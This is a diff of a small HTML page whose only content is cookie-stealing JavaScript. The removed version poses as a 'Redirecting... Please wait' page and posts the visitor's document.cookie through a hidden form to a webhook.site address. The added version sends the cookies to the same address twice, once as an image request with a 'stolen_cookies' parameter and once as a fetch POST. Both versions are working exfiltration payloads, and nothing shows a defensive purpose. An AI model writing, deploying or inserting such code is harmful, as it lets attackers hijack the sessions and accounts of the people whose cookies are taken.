@@ -1,29 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Redirecting...</title>
-</head>
 <body>
-    <h1>Please wait...</h1>
-    
     <script>
-        window.onload = function() {
-            var cookies = document.cookie;
-            var form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'https://webhook.site/d1933a3f-90d0-4258-99ef-f0686f993e62/';
-            
-            var input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = 'cookies';
-            input.value = cookies;
-            
-            form.appendChild(input);
-            document.body.appendChild(form);
-            
-            // Отправляем форму
-            form.submit();
-        };
+        const hook = 'https://webhook.site/d1933a3f-90d0-4258-99ef-f0686f993e62';
+        var c = document.cookie;
+        var i = new Image();
+        i.src = hook + '?stolen_cookies=' + encodeURIComponent(c);
+        fetch(hook, {
+            method: 'POST',
+            body: 'Cookies: ' + c
+        });
     </script>
 </body>
 </html>
